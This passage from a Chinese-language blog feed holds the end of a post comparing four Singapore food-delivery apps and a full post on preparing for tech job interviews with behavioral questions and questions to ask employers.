UberEATS，首頁也看不到任何跟優惠有關的東西，也沒有任何一個地方看得到過往資訊。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__0Jbn3jRCURT12tICIBcSWQ.png"></p><p>雖然說 foodpanda 跟 UberEATS 都沒有相關資訊，但不排除是因為這時間點<strong>沒有任何優惠</strong>，所以這樣看其實也不太準。</p><p>不過在這一題上面，我覺得勝出的是 honestbee，因為右上角那個小鈴鐺永遠都在，你永遠都可以主動查詢現在是不是有優惠，而不是像其他 App 那樣只能被動接收，沒有優惠就什麼都不顯示。</p><h3 id="狀況二：我想吃便宜一點的"><a href="#狀況二：我想吃便宜一點的" class="headerlink" title="狀況二：我想吃便宜一點的"></a>狀況二：我想吃便宜一點的</h3><p>以新加坡來說，外送的費用大約是 3 塊或是 3.5 新幣，有些 App 如果沒有達到最低購買價格，還會酌收其他的額外費用。因此有很多時候，我都希望能點個便宜的，加上運費之後才不會顯得太貴。</p><p>題外話，這四個外送服務當中，UberEATS 的機制跟 Uber 一樣，在需求量大於供給的時候會漲價，例如說下大雨或者是熱門時段，外送費可能會多加 5 塊新幣，總共就是 8 塊新幣左右。而其他間外送服務應該都不會加價，只會延長外送時間，例如說原本 30 分鐘變成 60 分鐘等等。</p><p>我們一樣先從 deliveroo 開始，儘管列表上有列價格大概是多少，但是沒有任何地方可以篩選。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__G8RBlPaAlXsuNfH4S7lJMQ.png"></p><p>再來是 foodpanda，右上角的篩選按鈕按下去，可以很輕易的篩選價格跟分類。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__FSJbi__2CsATCezBOwbesTg.png"></p><p>honestbee 在這邊的表現最差，沒有價格篩選，連價格標示也沒有。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__PpsraoZVurHJaVX1GW6Z6Q.png"></p><p>UberEATS 也是能夠很輕易的篩選價格。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__t0yWafVXU6waisIXcGwiVg.png"></p><p>也就是說，如果你想要根據價格來篩選，deliveroo 跟 honestbee 是辦不到的，只有 foodpanda 跟 UberEATS 可以。</p><p>honestbee 甚至連價格表示都沒有，該加油囉。</p><h3 id="狀況三：我想吃漢堡"><a href="#狀況三：我想吃漢堡" class="headerlink" title="狀況三：我想吃漢堡"></a>狀況三：我想吃漢堡</h3><p>很想吃某一類的食物也是很常見的需求，身為一個偶爾會很想吃漢堡的人，就來看看各個外送 App 能不能順利幫我篩選出漢堡吧！</p><p>deliveroo 順利過關，但它的分類都是用文字來表示，其實沒那麼吸引人。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__Z1NfsTwNNZkz__WJhMN2C0g.png"></p><p>foodpanda 也是用文字來表示各個分類，不過不能像 deliveroo 一樣搜尋就是了。但卻可以一次勾選多個分類來篩選。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__SnhzZOJgEnEPABscHiom9A.png"></p><p>比起上面那兩個 App 用文字來表現，honestbee 則是用一大堆精美圖片誘使你趕快點餐。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__UjqMclq0YFei9uK1lccNjA.png"></p><p>UberEATS 也一樣，用一堆拍得很好吃的圖片來激起你的食慾。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__DSwuxW6bV24YJ__U5wY3X7w.png"></p><p>四個 App 在分類上都是合格的，至少有這個功能。其他附加功能就見仁見智囉，例如說要不要圖片、要不要搜尋功能、要不要支援同時篩選多個分類等等。</p><h3 id="狀況四：訂餐完的進度"><a href="#狀況四：訂餐完的進度" class="headerlink" title="狀況四：訂餐完的進度"></a>狀況四：訂餐完的進度</h3><p>當順利訂完餐付完款之後，我個人最關心的有以下四項：</p><ol><li>餐廳有沒有接我的訂單？</li><li>預計還有多久會來？</li><li>司機現在在哪裡？（如果開始送餐了）</li><li>我什麼時候下訂單的？</li></ol><p>第四點是因為要看司機有沒有延誤很久。例如說 App 如果跟我講預計 30 分鐘送達，可是我 12 點下的訂單，1 點才送到，我就會覺得這個 App 在那邊騙。</p><p>deliveroo 把訂單分成四個階段：確認中、準備中、運送中、已送達。前三點都有做到，第四點的話雖然 App 上沒有寫，可是訂單確認之後會送 email 到你信箱，所以自己還是可以對的起來。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__NsMlqn0rGQCOWp9RrBUwVw.jpeg"></p><p>foodpanda 的介面很簡潔，就是一條時間軸跟你說現在在哪一個階段，以及每一個階段的時間。唯一沒達成的就是告訴我說司機現在在哪裡。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__0W2tubRDEa17P__FDDIb8lw.jpeg"></p><p>honestbee 的規劃跟 deliveroo 滿像的，都會告訴你在哪一個階段。不過我比較喜歡 deliveroo 的介面就是了，我覺得它有些動畫會動很酷…</p><p>還有一點差別就是 honestbee <strong>不會</strong>跟你說你什麼時候下訂單的，就連事後寄到信箱的明細裡面也不會有，這點扣分。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__YuzHckKvXA2B8vNiJ23FPw.jpeg"></p><p>UberEATS 不愧是做這種運輸服務起家的，介面上表現得最好，其實就跟你在搭 Uber 的時候沒兩樣。四款 App 中只有它完全符合我的四點要求。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__GrS__xV92iXqShtJPgC7luA.jpeg"><br><img src="/img/delivery-services-2d90ec1e3555/1__UPg2fMmpa94lFyM0DAZTKg.jpeg"></p><p>四個的表現其實都差不多，都有符合基本需求，但 UberEATS 略勝一籌，提供的資訊最多最完整。</p><h3 id="狀況五：收到餐點以後碰到問題怎麼辦？"><a href="#狀況五：收到餐點以後碰到問題怎麼辦？" class="headerlink" title="狀況五：收到餐點以後碰到問題怎麼辦？"></a>狀況五：收到餐點以後碰到問題怎麼辦？</h3><p>真心不騙，外送真的很會出包。</p><p>整個訂單完全送錯、部分品項做錯、少送東西等等都是很常發生的事情，所以一個好的外送服務，必須要能及時處理這些常見問題（或其實應該盡可能避免掉）。</p><p>其實這些外送 App 幾乎都會有即時線上客服，但 deliveroo 的藏得比較深一點，你必須點到訂單裡面去，點右上角的 order help 之後才能從選項裡面看到即時對話這一項。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__AzK96omFGJ1hyMol4iQMCA.png"></p><p>而 foodpanda 則是從左側導覽列裡面的 contact us 點下去，就會跳出即時聊天的選項。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__UEApbE3p31g4EzcjKYn3lg.png"></p><p>honestbee 的最好找，就是首頁右上角的那個聊天按鈕，點下去之後就到客服頁面了。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__Ummi__NcXjNI3jnpUz365DA.png"></p><p>UberEATS 是這之中唯一一間沒有提供線上客服（或是我找不到）的外送服務，你只能從訂單裡面回報碰到的問題，並且等他們自己來聯絡你。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__lwkPO4YDIOAIz0LMYKN__rg.png"></p><p>除了 UberEATS 以外，其他間都有即時客服，所以在這個狀況的表現都很不錯。</p><p>順帶一提，針對我開頭常見的那幾種狀況，我目前碰過的（honestbee 跟 deliveroo）都會給予補償。例如說餐點送達時間距離預期太久，會送你 5 塊新幣的 coupon 可以下次使用（但有些限制你必須要點 20 元以上才能折價）。</p><p>若是送錯品項，通常都會給你折扣或是直接把你那筆訂單的錢退回來，就算是賺到一餐了。如果是少送什麼東西，也會根據那樣東西的價值來退你錢，像我今天點了炸雞套餐發現少了一個炸雞，就獲得 5 塊新幣的補償。</p><p>如果是餐點本身的問題，像是我有一次吃完發現炒蛋裡面有蛋殼，一樣也獲得了全額退費的處理。</p><p>在這些問題的處理上，我覺得都滿不錯的，我也因此獲得了許多次的免費餐點跟折價券，為了把折價券用掉我就只能一直買一直買了…</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>針對上面五個狀況，先來做個評分好了，評分標準如下：</p><ol><li>做得特別好：10 分</li><li>有達成：8 分</li><li>有達成但不夠好：7 分</li><li>沒達成：6 分</li><li>沒達成而且還更爛：5 分</li></ol><p><img src="/img/delivery-services-2d90ec1e3555/1__9KJagzf4oZJPTv4R8wCn6w.png"></p><p>沒想到評完之後，居然四個 App 分數都一樣…</p><p>好啦其實也是滿符合實際狀況，用起來的感覺其實四個 App 真的差不多。不過有一點要特別提一下，那就是「查看優惠」的部分如同我之前講的，有可能是沒優惠的時候就不顯示，所以那部份的分數其實不太準。</p><p>但若是四個的運費相同，我會偏好使用 UberEATS，因為用起來感覺最好，而且合作的餐廳比較多。而以優惠來說的話，honestbee 的優惠其實最多，有國定假日或者不定期都會有一些優惠。</p><p>以上就是四個外送 App 的不專業評測，感謝大家的收看。如果有其他推薦的外送服務或者是有什麼優惠活動的話，也可以在底下留言，感謝感謝。</p>]]></content>
      
      
      <categories>
          
          <category> 科技 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科技 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面試問答準備心得之考前猜題</title>
      <link href="/2017/10/18/interview-prepare-b815d938f0de/"/>
      <url>/2017/10/18/interview-prepare-b815d938f0de/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/interview-prepare-b815d938f0de/1__UPo3vZAN6l3axfQ8__fim9g.jpeg"></p><p>前陣子剛結束求職之旅，有一些心得想要記錄下來，原本想寫兩篇，一篇是履歷相關的心得、另外一篇是面試問答準備（就是這一篇），仔細想想之後發現履歷相關心得可以分享的比較少，於是就作罷了。</p><p>如果對履歷相關心得有興趣的，可以參考下面這篇，我的做法也十分類似（只是沒有那麼認真），就是從 JD 上面畫重點，整理出這個職缺注重的能力，再回推到自己有哪些相關的經驗。</p><p><a href="https://medium.com/akichy/%E5%88%86%E4%BA%AB-%E5%BE%9E0%E5%88%B01%E7%9A%84%E6%B1%82%E8%81%B7%E6%8C%87%E5%8D%97-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E5%81%9A%E9%81%8E%E7%9A%84-%E7%99%BD%E5%B7%A5-7ca36a4632a2">從 0 到 1 的求職指南：那些年我做過的「白工」</a></p><p>以工程師來說，會被問到的問題幾乎都是技術問題。而這類問題的相關準備網路上資源已經很多了，反正不外乎就是跟你應徵的領域有關，以及共同科目資料結構、演算法、作業系統、網路 TCP&#x2F;IP 等等。</p><p>我這次準備最多的反倒不是技術問題，而是 behavior question，這類的問題不外乎是問你在某種狀況之下會怎麼做，或是問你之前有沒有類似的經驗。</p><p>除了被問問題以外，求職的另外一個重要環節是問面試官問題，我覺得這個步驟真的超級重要，多問一點可以讓你更了解這間公司或者是工作上的細節。以前求職時不懂事，完全不知道要問什麼，就傻傻地進了公司，進去之後才發現不是自己想像中的那回事。</p><p>有了以前的經驗，就知道下一次面試時該問什麼問題了。</p><p>除了技術問題跟 behavior question 以外，還有常見問題以及跟自身背景有關的問題，常見問題像是：做個簡單的自我介紹、為什麼想加入我們、為什麼離開上一間公司等等。跟自身相關的問題對每個人來說就差異很大了，因為每個人的背景都不太一樣。</p><p>下面會分幾個段落來講各種問題的準備。</p><h3 id="主要原則"><a href="#主要原則" class="headerlink" title="主要原則"></a>主要原則</h3><p>雖然已經脫離校園好一段時間了，但大家應該還記得以前是怎麼準備考試的。基本上面試就跟考試沒兩樣，就是考前猜題然後練習，準備得越充足，表現就越好。</p><p>但如果只是死背題目的話，碰到一點變化就完蛋了，因為只是死背而沒有去理解。我認為比較好的方式還是去仔細理解題目要問的到底是什麼。通常面試題目都可以簡單的分類幾個類別，每個類別內的題目都類似，這個等等會再提到。</p><p>之前看過一篇文章寫說面試在回答問題時，其實就跟說故事一樣，你要說得完整、說人引人入勝，說得越好，表現得就越好。仔細想一想發現滿有道理的。</p><p>大家應該有聽過 STAR 法則，是由下面四個單字開頭組合而成的：</p><ol><li>情境(Situation)</li><li>任務(Task)</li><li>行動(Action)</li><li>結果(Result)</li></ol><p>如果不知道怎麼回答，就可以先從這四個方向去想，就能夠構成一個具有完整架構的故事。</p><p>接著談一談準備的方式好了，一般來說我都是先擬好題目，然後再稍微寫一下答案。我有認識的人是會把寫下來的答案直接背起來的那種，但我這個人一旦背了，就會表現得一副：「我在唸稿」的樣子，極度不自然。</p><p>因此我自己稍微寫過怎麼回答以後，會簡略的記下來以便下次複習。準備的過程也滿簡單，就是自己回答一兩次。因為這次面試都是英文的，所以在回答的途中如果有些地方卡住，就可以去查那些卡住的地方應該怎麼講會比較順，也可以發覺有哪些單字自己不熟悉而記下來。</p><p>總而言之，就是自己幫自己模擬面試的意思。</p><h3 id="面試必問問題"><a href="#面試必問問題" class="headerlink" title="面試必問問題"></a>面試必問問題</h3><p>以我這次跟以往的經歷來說，有幾題出現的機率超級高，我把它歸類在必問問題。</p><ol><li>可以做個簡單的自我介紹嗎？</li><li>可以講一下你現在在做什麼嗎？（針對在職找工作的人）</li><li>可以講一下你上一份工作在做些什麼嗎？（針對離職後找工作的人）</li><li>上一份為什麼想要離職？</li><li>為什麼想加入我們公司？（或者是：為什麼對這個職位有興趣？）</li></ol><p>這類問題其實不用花太多時間準備，因為跟自身相關的問題，一定是最熟悉的。總不可能叫你自我介紹，然後你想個三十分鐘還想不出來吧？</p><p>這類問題相對親切，而且一定會一直一直一直被問到，但只要花點時間準備一下就好。</p><p>以我來說，叫我自我介紹的話，我的回答大概是這樣：</p><blockquote><p>Hi, I am huli from Taiwan. I have been worked in Singapore for about 1 year. I work at Garena, I was responsible for built a live streaming website like twitch and youtube gaming. The player can streaming while they are playing the game, and the viewer can chat, donate or send gift. I focus on the frontend part, and there is only 1 people in frontend, which is me. The team is quite small, just me and 3 backend developer and PM.</p></blockquote><p>這邊順便講一下，如果你跟我一樣是一個英文普通或是稍差的人，英文面試的唯一訣竅就是：</p><blockquote><p>說就對了。</p></blockquote><p>管他什麼文法錯誤、時態錯誤或是單字用錯，你說就對了。文法錯誤也比什麼不說來的好，至少你盡力去表達了。而且面試就那麼一次，你這次不說，以後也沒機會說了，所以到那個時候，只要什麼都不管，儘管說就是了。</p><p>因為面試官的英文通常都滿好的，儘管你有些小錯誤，他一定聽得懂你想表達的意思大概是什麼，舉例來說，你看看下面這一段好了：</p><blockquote><p>你好，我叫阿明，三個月在台灣居住，現在當老師在補習班，教小朋友英文。我學中文已經三個多月，以前在美國當業務拍賣東西，很興奮認識你。</p></blockquote><p>上面這段是模擬中文一些奇怪的文法，但儘管如此，你一定看得懂上面那段在說些什麼，因為你中文很好嘛！我自己覺得對那些英文很好的面試官來說，我在回答時他們應該也是這樣的。可能有些地方用錯，但他們一定聽得懂，反正如果聽不懂他們應該也會問才對。</p><p>總之，真的就是說就對了，這次不說下次也沒機會說了，就豁出去吧！</p><p>這些必問問題通常在第一關 phone interview 的時候就會碰到了，我的參考資料有以下幾篇文章：</p><ol><li><a href="https://biginterview.com/blog/2013/05/describe-your-position.html">HOW TO ANSWER: Describe your current position.</a></li><li><a href="https://www.contactsingapore.sg/Media/ContactSingapore/TC/Job%20Seeker/Find%20a%20Job/Self%20Help%20Guide/Trad-Chinese-Self-help-Guide-Interview.pdf">面試準備與技巧</a></li><li><a href="https://tw.blog.voicetube.com/archives/15749">【商用英語】電話英語面試 5 步驟，前進外商不是問題！</a></li><li><a href="https://www.thebalance.com/phone-interview-questions-and-answers-2061217">Phone Interview Questions and the Best Answers</a></li></ol><h3 id="自身相關問題"><a href="#自身相關問題" class="headerlink" title="自身相關問題"></a>自身相關問題</h3><p>這一類的問題都跟你自己有關，所以你要自己從你的背景裡面去想說可能會被問一些什麼問題。</p><p>以我自己來說，我那時候準備了下面這些問題：</p><ol><li>為什麼休學</li><li>為什麼不念資工系</li><li>為什麼念哲學</li><li>在哲學系你學到什麼</li><li>你最驕傲的成就是什麼</li><li>你的優點是什麼</li><li>你的缺點是什麼</li><li>你怎麼持續讓自己獲得科技相關的新知</li></ol><p>跟自己相關的問題其實也滿好答的，準備方式就跟之前說的一樣，自己擬一個答案之後試圖回答，邊回答邊記錄自己卡住的地方，查查看有什麼單字可以用。回答個幾次之後就會熟悉這個答案了，講得會順很多。</p><h3 id="Behavior-question"><a href="#Behavior-question" class="headerlink" title="Behavior question"></a>Behavior question</h3><p>我在這一類的問題上面花了最長的時間。</p><p>原因很簡單，因為工程師比較少碰到這類的問題。我以往的經歷都只會被問技術問題而已，其他問題超級少。但因為我這次投的職缺有一個是 support engineer，跟一般工程師的工作內容比較不一樣，所以有一關就是一直在考這類型的問題。</p><p>準備方式同上，先找好題目之後自己準備。但這邊的題目超級多，所以不太可能每一題都準備。我認為比較好的做法是稍微分類一下，把類似的題目分在一起，可以用同一個故事來回答。</p><p>我最後準備好的題庫長這樣：</p><h4 id="目標相關：如何設定、如何完成、達成與沒達成的經驗"><a href="#目標相關：如何設定、如何完成、達成與沒達成的經驗" class="headerlink" title="目標相關：如何設定、如何完成、達成與沒達成的經驗"></a>目標相關：如何設定、如何完成、達成與沒達成的經驗</h4><ol><li>Give an example of how you set goals.</li><li>Give an example of a goal you reached and tell me how you achieved it.</li></ol><h4 id="壓力相關：如何跟壓力共處？在壓力之下如何有效率工作？"><a href="#壓力相關：如何跟壓力共處？在壓力之下如何有效率工作？" class="headerlink" title="壓力相關：如何跟壓力共處？在壓力之下如何有效率工作？"></a>壓力相關：如何跟壓力共處？在壓力之下如何有效率工作？</h4><ol><li>Tell me about how you worked effectively under pressure.</li><li>How did you handle meeting a tight deadline?</li><li>Tell me about a time you were under a lot of pressure. What was going on, and how did you get through it?</li></ol><h4 id="失敗、犯錯類"><a href="#失敗、犯錯類" class="headerlink" title="失敗、犯錯類"></a>失敗、犯錯類</h4><ol><li>Tell me about a time you failed. How did you deal with the situation?</li><li>Have you ever made a mistake? How did you handle it?</li></ol><h4 id="挑戰類"><a href="#挑戰類" class="headerlink" title="挑戰類"></a>挑戰類</h4><ol><li>Describe a complex situation you encountered and how you solved it</li><li>Have you handled a difficult situation? How?</li><li>How do you handle a challenge? Give an example.</li><li>Tell me the most difficult issue you encountered</li></ol><h4 id="做決定類：你如何做決定？怎麼搜集資訊？"><a href="#做決定類：你如何做決定？怎麼搜集資訊？" class="headerlink" title="做決定類：你如何做決定？怎麼搜集資訊？"></a>做決定類：你如何做決定？怎麼搜集資訊？</h4><ol><li>Did you ever make a risky decision? Why? How did you handle it?</li><li>Did you ever postpone making a decision? Why?</li><li>Describe a decision you made that wasn’t popular and how you handled implementing it.</li><li>Tell me about a difficult decision you’ve madein the last year.</li><li>Do you always make decisions on your own without the help of others?</li></ol><h4 id="團隊合作類：如何團隊合作"><a href="#團隊合作類：如何團隊合作" class="headerlink" title="團隊合作類：如何團隊合作"></a>團隊合作類：如何團隊合作</h4><ol><li>Give an example of how you worked on a team.</li><li>Share an example of how you were able to motivate employees or co-workers.</li></ol><h4 id="溝通類"><a href="#溝通類" class="headerlink" title="溝通類"></a>溝通類</h4><ol><li>What do you do if you disagree with someone at work?</li><li>What do you do if you disagree with your boss?</li><li>Do you listen? Give an example of when you did or when you didn’t listen.</li><li>If there is a disagreement at work, how do you solve the conflict?</li><li>Describe a situation in which you were able to use persuasion to successfully convince someone to see things your way.</li><li>Can you give me an example when you handled some conflict in work environment? What is your typical way of dealing with conflicts?</li></ol><h4 id="工作排程類：如何處理工作上的優先程度？"><a href="#工作排程類：如何處理工作上的優先程度？" class="headerlink" title="工作排程類：如何處理工作上的優先程度？"></a>工作排程類：如何處理工作上的優先程度？</h4><ol><li>When you worked on multiple projects how did you prioritize?</li><li>How do you prioritise projects &amp; tasks when scheduling your time? Give me two examples.</li></ol><h4 id="主動類：你有多積極？"><a href="#主動類：你有多積極？" class="headerlink" title="主動類：你有多積極？"></a>主動類：你有多積極？</h4><ol><li>Give me an example of when you showed initiative and took the lead.</li><li>Describe a time when you anticipated potential problems and developed preventive measures</li><li>Can you tell me a time when took the initiative at improving processes at your work?</li><li>Have you gone above and beyond the call of duty? If so, how?</li></ol><p>每一類的題目我都準備了一到兩個小故事，以我自身的例子來回答那些問題。舉例來說，在回答溝通類的問題時，我會舉一個我跟設計師溝通的例子。</p><p>S: 跟設計師討論 UI 怎麼改，例如說這個 button 會不會太暗<br>A: 對我來說，好的 UX 就是不會讓你覺得怪，但彼此各有各的角度<br>R: 當兩個人都很合理的時候，我會尊重專業</p><p>我到後面越準備越發現 T 好像不是那麼明確，或者說其實在很多故事中也不用特別提到，之後就索性不寫了。但只要不妨礙故事的完整性即可。</p><p>回答有關挑戰類的題目時，我準備了這個故事：</p><p>S: 發現 cookie 沒辦法寫進去，狀況很詭異<br>T: debug<br>A: 找 chrome 原始碼，找到 cookie 那部分，看到解釋<br>R: 成功解決 bug 並且寫 blog 文章分享</p><p>我記錄下來的就是一些重點而已，詳細的故事因為是自身的經歷，所以不用特別去記也不致於忘記。跟我上面所說的一樣，我會把這個故事自己講一遍試試看，把一些卡的地方給修正掉。</p><p>最後再舉一個例子，我回答犯錯、失敗類的題目或者是「如何跟壓力共處」會舉下面這個故事：</p><p>S: 發現網站出問題，player 不能播<br>T: 修好 player<br>A: 不能心急，stay calm more than usual，越心急越會出錯<br>R: 修好之後趕快上線，隔天上班補足相關測試</p><p>我的完整回答大概會是下面這樣：</p><blockquote><p>One day, maybe at 9 or 10 pm, my PM told me that some channels can not watch. The users report that the player is a black screen. It make me feel pressure because I have to run against the time. I have to fix it asap. But I know that at that situation, I have to stay calm more than usual. Because if you are nervous, the more possibility you could make mistake.</p></blockquote><blockquote><p>So, what I do is stay calm and try to recall that what I have changed on that day. And I quickly found there is a bug in the code, a small change cause this issue. So I just rollback to the previous version and deploy again. bug fixed.</p></blockquote><blockquote><p>There is one thing I learned: never deploy a new feature or a new version on Friday. or maybe you have to work on the weekend. Also, for me, the most important thing is not about “you made a mistake”. It’s about what you learned from this? and how to prevent it happening again.</p></blockquote><p>我就想到什麼打什麼，但跟我當初的回答應該差不多。上面一定有一大堆文法錯誤，但我相信應該還是能理解我想表達的意思。</p><p>在準備 behavior question 的過程中，我參考了下面這些資源：</p><ol><li><a href="https://www.thebalance.com/top-behavioral-interview-questions-2059618">Top 10 Behavioral Interview Questions and Answers</a></li><li><a href="https://www.thebalance.com/behavioral-job-interview-questions-2059620">28 Behavior Based Job Interview Questions</a></li><li><a href="https://www.themuse.com/advice/30-behavioral-interview-questions-you-should-be-ready-to-answer">30 Behavioral Interview Questions You Should Be Ready to Answer</a></li><li><a href="https://biginterview.com/blog/behavioral-interview-questions">Behavioral Interview Questions</a></li><li><a href="https://theinterviewguys.com/behavioral-interview-questions-and-answers-101/">Behavioral Interview Questions And Answers 101</a></li><li><a href="http://www.newcomerwomen.org/2011/pdfs/Chn_Interviewing_Workshop_july2011%5B1%5D.pdf">Effective Interviewing Skills</a></li><li><a href="https://www.youtube.com/watch?v=qKBubKO-798">How to Answer “Behavior Based Interview Questions” — Interview Tip</a></li><li><a href="https://www.indeed.com/career-advice/interviewing/handled-difficult-situation-interview-question">Interview Question: Tell me about a time you handled a difficult situation</a></li><li><a href="http://www.essaycrafter.org/evon-writing/behavioral-interview-questions-preparation-model-answers/">英文面試系列: Behavioral 行為問題答題技巧及破解口試陷阱</a></li><li><a href="http://www.consultingincubation.org/cin-insight/2014/2/4/behavior-interview-by-xumin">Behavior Interview－－我的一点经验（节选） by Xumin Hu</a></li></ol><h3 id="最後一關：有什麼想問我的嗎？"><a href="#最後一關：有什麼想問我的嗎？" class="headerlink" title="最後一關：有什麼想問我的嗎？"></a>最後一關：有什麼想問我的嗎？</h3><p>這通常都是面試的最後一題了。攻守交換，由你來問面試官問題，對方負責回答。</p><p>我上面有說過了，這是很重要的一個階段，可以讓你更了解公司在做些什麼，以及他們的工作型態等等。這個階段事先準備好問題很重要，我通常還會存在 Evernote 避免忘記。</p><p>先給大家看一下我這次面試中有問的，然後我覺得還不錯的問題：</p><ol><li>Could you describe the day of the support engineer?</li><li>How do you measure the performance for the support engineer?（問主管的）</li><li>What’s your favorite part about working here?</li></ol><p>第一個問題可以讓我更了解這個職位在做什麼，第二個問題讓我知道哪些項目會列入考核標準，最後一個則是對每一個人都可以問的一個滿有趣的問題。</p><p>不過我問的問題其實滿普通的，如果你願意的話也可以問一些特別的，例如說：在這邊工作你最討厭什麼？之類的。</p><p>其實這裡的問題根據應徵的職位差距很大，我只能列出我這次準備的跟工程師相關的題目：</p><h4 id="工作流程相關"><a href="#工作流程相關" class="headerlink" title="工作流程相關"></a>工作流程相關</h4><ol><li>你如何知道你每天要做什麼？（How do you know what to work on each day）</li><li>可以試著描述你的一天在做什麼嗎？</li><li>假設上線後發現一個 bug，處理流程會是什麼</li><li>用什麼版本控制工具？如果是 git，那對於 branch 的處理流程為何？例如說：bug&#x2F;feature 各開一個 branch? What version control system do you use?</li></ol><h4 id="團隊相關"><a href="#團隊相關" class="headerlink" title="團隊相關"></a>團隊相關</h4><ol><li>用什麼樣的協作工具？（What collaboration tools do you use?）</li><li>工程師總人數</li><li>一個專案大概有多少人，有哪些人？怎樣分佈的？工程師可以參與產品開發的討論嗎？</li><li>前端團隊幾個人，怎麼分工？</li><li>進去之後會跟哪些人一起工作</li><li>前端跟設計師透過什麼工具配合</li></ol><h4 id="程式細節相關"><a href="#程式細節相關" class="headerlink" title="程式細節相關"></a>程式細節相關</h4><ol><li>會寫單元測試嗎？用了哪些工具？（Do you write unit tests? what tools do you use?）</li><li>有寫 end-to-end 測試嗎？</li><li>有做 code review 嗎？（Do you do code review? Does all code get reviewed?）</li><li>有用 Jenkins 或 Travis 做 CI 嗎？（Do you have continuous integration? like Jenkins or travis?）</li><li>Server 放在雲端還是自己建</li><li>可以談談公司裡面使用到的技術棧嗎？</li><li>平均的 qps</li></ol><h4 id="產品相關"><a href="#產品相關" class="headerlink" title="產品相關"></a>產品相關</h4><ol><li>這個產品的 DAU 是多少？</li><li>這個產品的下一個主要目標是什麼？</li></ol><h4 id="福利相關"><a href="#福利相關" class="headerlink" title="福利相關"></a>福利相關</h4><ol><li>醫療保險</li><li>一般看病的補助</li><li>年假幾天？How many annual leaves do you have?</li><li>參加技術活動有沒有補助</li></ol><h4 id="制度相關"><a href="#制度相關" class="headerlink" title="制度相關"></a>制度相關</h4><ol><li>怎麼做績效考核？（How do you measure individual performance）</li><li>會固定調薪嗎？（Do you do annual salary increases?）</li><li>What time do people normally leave work?</li><li>Would I need to be on call? How often?</li></ol><h4 id="假如是國外公司"><a href="#假如是國外公司" class="headerlink" title="假如是國外公司"></a>假如是國外公司</h4><ol><li>租房補助</li><li>簽證</li><li>機票補助</li></ol><p>總之這邊的準備就是好好思考一下有哪些想要問的。通常最有靈感的時候會是什麼？會是你加入一間新公司的時候。因為有可能新公司跟你的期望不符，例如說你原本預期是加入一個 team，結果進去之後卻是一人戰隊。</p><p>這時候你一定會想在下一次面試時問說：「可以談談我之後會加入的 team 嗎？有幾個人？還是其實只有我一個？」。</p><p>不過，公司當然也有可能會騙人，給你錯誤的資訊。但這邊就不考慮這種的可能性了，因為這種很難防。如果大家有什麼防止公司騙人的小技巧，也麻煩留言在底下，感激不盡。</p><p>我覺得我問的問題算是很普通的了，有一些題目更刁鑽更難回答一點，不過要問什麼就是見仁見智啦，我覺得我問上面那些就滿夠的了。建議大家偶爾維護一下自己的題庫，就不用每次求職時再想一遍了。</p><p>有關於這些問公司的問題，底下這些都是很好的參考資料：</p><ol><li><a href="https://jvns.ca/blog/2013/12/30/questions-im-asking-in-interviews/">Questions I’m asking in interviews</a></li><li><a href="https://blog.louie.lu/2017/04/30/%E9%96%8B%E7%99%BC%E4%BA%BA%E5%93%A1%E7%9A%84%E9%9D%A2%E8%A9%A6%E6%8C%87%E5%8D%97-a-developers-guide-to-interviewing/">開發人員的面試指南  — A developer’s guide to interviewing</a></li><li><a href="https://www.managertoday.com.tw/english/view/52235">「Any questions?」英文面試的最後一題，你該這樣答！</a></li><li><a href="https://tw.blog.voicetube.com/archives/21421">【職場英文】沒問題就是有問題！ 面試時你應該問的 9 個好問題！</a></li></ol><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>面試就像考試一樣，考前猜題、寫擬答、反覆練習。當你的面試經歷豐富之後，就會發現有些題目一再出現，這些就是所謂的萬年考古題了。</p><p>其實我的面試經驗也不多啦，尤其是最近兩次求職，都是只面了一兩間就拿到 offer，就決定不去面其他的了。寫這篇文章一來是為自己留個紀錄，二來是覺得這篇文章應該可以幫助到一些人。</p><p>以前我對於準備面試其實滿沒有頭緒的，而且我認為不用刻意準備也可以，因為你有多少實力，面試就能表現出多少。但後來我發現面試其實就跟考試一樣，是可以刻意準備、刻意練習的。既然有這個練習的機會，why not?</p><p>大概就是這樣了，祝大家面試順利！</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一個工程師的履歷進化史</title>
      <link href="/2017/10/10/resume-evolution-4c337ff30729/"/>
      <url>/2017/10/10/resume-evolution-4c337ff30729/</url>
      
